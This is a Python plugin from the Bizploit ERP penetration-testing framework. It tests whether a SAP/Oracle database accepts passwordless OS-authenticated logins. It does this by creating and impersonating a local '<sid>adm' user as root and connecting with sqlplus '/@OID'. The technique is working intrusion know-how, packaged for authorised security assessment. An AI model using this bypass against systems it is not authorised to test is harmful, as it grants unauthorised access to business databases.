# -*- coding: latin-1 -*-
'''
---------------------------------------------------------------------------
Bizploit - The Opensource ERP Penetration Testing Framework. 
Download at http://www.onapsis.com/bizploit 
--------------------------------------------------------------------------- 

@author:  Mariano Nu�ez Di Croce <mnunez@onapsis.com>    
    
Portions Copyright 2012 ONAPSIS S.R.L.
Base Copyright Mariano Nu�ez Di Croce @ CYBSEC

This program is free software; you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation version 2 of the License.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.
You should have received a copy of the GNU General Public License
along with this program; if not, write to the Free Software
Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
---------------------------------------------------------------------------
'''

from core.basePlugins.baseVulnAssessPlugin import baseVulnAssessPlugin
import core.exceptions.bizploitException as bizploitException
import core.baseResult.pluginResult as pluginResult
import subprocess
import tempfile
import core.lib.misc as misc
import sys,  os
import platform

# TODO: Add Win support
# TODO: Add Oracle OID bruteforce.

if platform.system() == 'Linux':
	import pwd

class oraAuth(baseVulnAssessPlugin):
	'''
	Checks if SAP/Oracle authentication mechanism is vulnerable (Linux only).
	
	@author: Mariano Nu�ez Di Croce 
	'''
	def __init__(self):
		baseVulnAssessPlugin.__init__( self )
		self._pluginDeps = ['vulnassess.sapinfo']
		self._sqlplusPath = '/usr/bin/sqlplus'
		self._cmdAddUser = '/usr/sbin/adduser --system --no-create-home'
		self._cmdDelUser =  '/usr/sbin/deluser'
		
		self._dbhost = 'auto'
		self._dbport = 1527
		self._sid = 'auto'
		self._oid = 'auto'
		
		self._tmpDir = ''
		self._tnsFileName = 'tnsnames.ora' 
		self._sqlFileName = 'tmpSQLbizploit.sql'
		self._desc = 'Checks if SAP/Oracle authentication mechanism is vulnerable (Linux only).'
		

	def _run_SAPRFC(self):
		'''
		In order to check for this, we try to run a "SELECT user FROM dual" naive query. 
		'''
		
		if platform.system() != 'Linux':
			self.outInformation('This plugin can only run in Linux systems. Sorry.')
			return
		
		if self._sqlPlusInstalled() != 0:
			self.outInformation('SQL*Plus not detected at ' + self._sqlplusPath + '. Please verify that it is installed before running this plugin')
			return
		
		dbhost = self._dbhost
		sid = self._sid
		oid = self._oid
		
		# Check that we are targetting and Oracle Database
		data = {}
		try:
			data = self._kb.getData(self._connector, 'systeminfo').getData('systeminfo')
		except:
			self.outDebug('No information about remote target')
			
		if not data:
			if dbhost == 'auto' or sid == 'auto' or oid == 'auto':
				self.outInformation('It was not possible to run sapinfo. You can\'t use "auto" options for oraAuth.')
				return 
				
		elif 'ORACLE' in data['RFCDBSYS'].upper():
			if dbhost == 'auto':
				dbhost = data['RFCDBHOST'].strip()
			if sid == 'auto':
				sid = data['RFCSYSID'].upper().strip()
			if oid == 'auto':
				# We assume that the Oracle Instance is the same as SAPSID.
				oid = data['RFCSYSID'].upper().strip() 
		else:
			self.outInformation('Error: The reported DB \'' + data['RFCDBSYS'] + '\' is not Oracle or there is not information about it.')		
			return 
		
		# We already have the connection parameters. Start the rock and roll!
		# Check if root
		if os.getuid() != 0:
			self.outInformation('Error: You need root privileges to run this plugin.')
			return 
		
		# Create and switch to the 'sidadm' user.
		username = sid.lower().strip() + 'adm'
		if not misc.validateInput(username,  '^\w*$'):
			self.outInformation('Username seems weird. Exploiting bizploit? Aborting just in case.')
			return	
			
		# Check if user already exists
		self.outInformation('Checking if the \'' + username + '\' user already exists...')
		try:
			self._userUID = pwd.getpwnam(username)[2]
			self.outInformation('User already exists.')
		except:
			self.outInformation('It does not exist. Creating the \'' + username + '\' user...')
			retCode,  res = self._createUser(self._cmdAddUser, username)
			if retCode == 0:
				self.outInformation('User created/updated.')
			else:			
				self.outInformation('User creation failed! See debug info. Stopping execution.')
				self.outDebug('CreateUser error: ' + res)
				return
		
		self.outInformation('Switching to the \'' + username + '\' user...')
		if self._switchToUser(username):
			self.outInformation('User switch successful.')
		else:
			self.outInformation('User switch failed! Stopping execution.')
			return
			
		# Create the tnsnames file
		self.outInformation('Creating Oracle connection file ...')
		try:
			self._tmpDir = tempfile.mkdtemp() 
			# Nop, I will not validate that you use a malicious local script file...
			self._tnsFile = self._tmpDir + '/' + self._tnsFileName
			self._createTNSNAMES(dbhost, self._dbport, oid)
			self.outInformation('File created.')
		except:
			self.outInformation('File creation failed!')
			return
		
		# Configure local OS environment variables and call sqlplus
		os.environ['TNS_ADMIN'] = self._tmpDir
		if not (misc.validateInput(dbhost,  '^(\d+)\.(\d+)\.(\d+)\.(\d+)$') or misc.validateInput(dbhost,  '^[a-zA-Z0-9\.]{3,40}$')):
			self.outInformation('Dbhost seems strange. Exploiting bizploit? Aborting just in case.')
			return	
		
		# Create tmp SQL naive file.
		sqlfile =  self._tmpDir + '/' + self._sqlFileName
		f = open(sqlfile,  'w')
		f.write("SELECT USER FROM DUAL;\nEXIT;")
		f.close()
		
		# Run sqlPlus 
		self.outInformation('Checking access to the Oracle Database...')
		retCode,  resText = self._runSQLPlus(oid, sqlfile)
		if retCode == 0:
			# The command was successful
			self.outInformation('Access was successful!')
			self.outVulnerability('Vulnerable SAP/Oracle authentication mechanism')
			
			# Create the result object
			resPlugin = pluginResult.pluginResult(self)
			resPlugin.setVulnID(7)
			resPlugin.setName('Vulnerable SAP/Oracle authentication mechanism')
			resPlugin.setDesc('It is possible to access the Oracle database without specifying logon credentials. This situation allows a remote attacker to perform security sensitive operations over the database engine, possibly affecting the integrity and availability of the SAP implementation. ')
			resPlugin.setData('canAccessOracle',  True)
			resPlugin.setData('sqlplusPath',  self._sqlplusPath)
			resPlugin.setData('oid',  oid)
			resPlugin.setData('userid', self._userUID)			
			resPlugin.setConnectionInfo(self._target,  self._connector)
			resPlugin.setRisk(pluginResult.RISK_HIGH)
			resPlugin.setSolution('Restrict access to the Oracle Listener, allowing connections only from related SAP instances.')
				
			self.saveToKB('canAccessOracle', resPlugin)
			
		elif 'ORA-12505' in resText:
			self.outInformation('Connection failed. It seems that the OID \'' + oid + '\' does not exist in the Oracle DB. Please configure the \'oid\' plugin option.')
			self.outWarning('You should manually remove the user \'' + username + '\'.')
			self.outDebug('Return from SQL*Plus: retcode=' + str(retCode) + ' - msg=' + resText.strip())
		else:
			# Not possible
			self.outInformation('Acess failed. Access control may be in place.')
			self.outWarning('You should manually remove the user \'' + username + '\'.')
			self.outDebug('Return from SQL*Plus: retcode=' + str(retCode) + ' - msg=' + resText.strip())
	
	def _createUser(self, cmd, username,  switchToUser=False):
		
		cmds = cmd.split(' ')
		cmds.append(username)

		# Creates an operating system user (tested on Ubuntu only)
		out,  name = tempfile.mkstemp(text=True)
		
		proc = subprocess.Popen(cmds,   
												#stdout=open('/dev/null',  'w'),   												
												stdout = out, 
												stderr=subprocess.STDOUT
												)								
		# Wait for the process to finish
		retCode = proc.wait() 
		
		# Get the output to check for errors
		out = open(name,  'r')
		res = out.read()
		out.close()
		
		return retCode,  res
	
	def _switchToUser(self, username):
			
		try:
			uid = pwd.getpwnam(username)[2]		
			self._userUID = uid	
			os.setuid(uid)		
		except:
			return False				
		
		return True
	
	def _createTNSNAMES(self, dbhost, dbport, oid):
		content =  oid + '.WORLD=(DESCRIPTION = (ADDRESS_LIST = (ADDRESS = (COMMUNITY = SAP.WORLD) ' \
				'(PROTOCOL = TCP) (HOST = ' + dbhost + ') (PORT = ' + str(dbport) + ')))' \
				'(CONNECT_DATA = (SID = ' + oid + ') (GLOBAL_NAME = ' + oid + '.WORLD)))'	
		f = open(self._tnsFile,  "w")
		f.write(content)
		f.close()	
	
	def _sqlPlusInstalled(self):
		try:
			proc = subprocess.Popen([self._sqlplusPath, '--help'],  
												stdout=open('/dev/null',  'w'),   
												stderr=subprocess.STDOUT)
			return proc.wait()
		except OSError,  e:
			return 1
	
	def _runSQLPlus(self,  oid,  fname=''):
		out,  name = tempfile.mkstemp(text=True)
		
		proc = subprocess.Popen([self._sqlplusPath, '-S',  '-L',  '/@' + oid + '.WORLD',  '@' + fname],  
												#stdout=open('/dev/null',  'w'),   												
												stdout = out, 
												stderr=subprocess.STDOUT)								
		# Wait for the process to finish
		retCode = proc.wait() 
		
		# Get the output to check for errors
		out = open(name,  'r')
		res = out.read()
		out.close()
		
		return retCode,  res
		
	def getOptionsXML(self):
		'''
		This method returns a XML containing the Options that the plugin has.
		Using this XML the framework will build a window, a menu, or some other input method to retrieve
		the info from the user. The XML has to validate against the xml schema file located at :
		bizploit/core/ui/userInterface.dtd
		
		@return: XML with the plugin options.
		'''	
		return	'<?xml version="1.0" encoding="ISO-8859-1"?>\
		<OptionList>\
			<Option name="dbhost">\
				<default>'+ self._dbhost +'</default>\
				<desc>Database host</desc>\
				<type>String</type>\
				<required>True</required>\
				<visible>True</visible>\
			</Option>\
			<Option name="dbport">\
				<default>'+ str(self._dbport) +'</default>\
				<desc>Database port</desc>\
				<type>Integer</type>\
				<required>True</required>\
				<visible>True</visible>\
			</Option>\
			<Option name="sid">\
				<default>' + self._sid +'</default>\
				<desc>SAP System ID</desc>\
				<type>String</type>\
				<required>True</required>\
				<visible>True</visible>\
			</Option>\
			<Option name="oid">\
				<default>' + self._oid +'</default>\
				<desc>Oracle Instance ID</desc>\
				<type>String</type>\
				<required>True</required>\
				<visible>True</visible>\
			</Option>\
			<Option name="sqlplusPath">\
				<default>'+ self._sqlplusPath +'</default>\
				<desc>Path to the SQL*Plus program.</desc>\
				<type>String</type>\
				<required>True</required>\
				<visible>True</visible>\
			</Option>\
			<Option name="cmdAddUser">\
				<default>'+ self._cmdAddUser + '</default>\
				<desc>Command to add an operating system user</desc>\
				<type>String</type>\
				<required>True</required>\
				<visible>True</visible>\
			</Option>\
		</OptionList>\
		'

	def setOptions( self, OptionList ):
		'''
		This method sets all the options that are configured using the user interface 
		generated by the framework using the result of getOptionsXML().
		
		@parameter OptionList: A dictionary with the options for the plugin.
		@return: No value is returned.
		'''	
		if 'dbhost' in OptionList.keys(): 
			self._dbhost = OptionList['dbhost']
		if 'dbport' in OptionList.keys(): 
			self._dbport = OptionList['dbport']
		if 'sqlplusPath' in OptionList.keys(): 
			self._sqlplusPath = OptionList['sqlplusPath']
		if 'sid' in OptionList.keys(): 
			self._sid = OptionList['sid']
		if 'oid' in OptionList.keys(): 
			self._oid = OptionList['oid']
		if 'cmdAddUser' in OptionList.keys(): 
			self._cmdAddUser= OptionList['cmdAddUser']
